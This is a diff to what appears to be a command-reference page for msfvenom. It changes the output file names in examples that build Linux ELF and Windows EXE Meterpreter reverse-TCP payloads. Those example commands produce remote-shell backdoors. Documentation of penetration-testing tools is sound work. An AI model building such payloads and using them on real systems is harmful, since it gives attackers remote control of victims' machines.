@@ -15,10 +15,10 @@
 
 `msfvenom -p {{payload}} --list-options`
 
-- Create an elf with a reverse tcp handler:
+- Create an elf binary with a reverse tcp handler:
 
-`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f elf > reverseTcpElf`
+`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f elf > path/to/binary`
 
 - Create an exe with a reverse tcp handler:
 
-`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f exe > reverseTcp.exe`
+`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f exe > path/to/binary.exe`
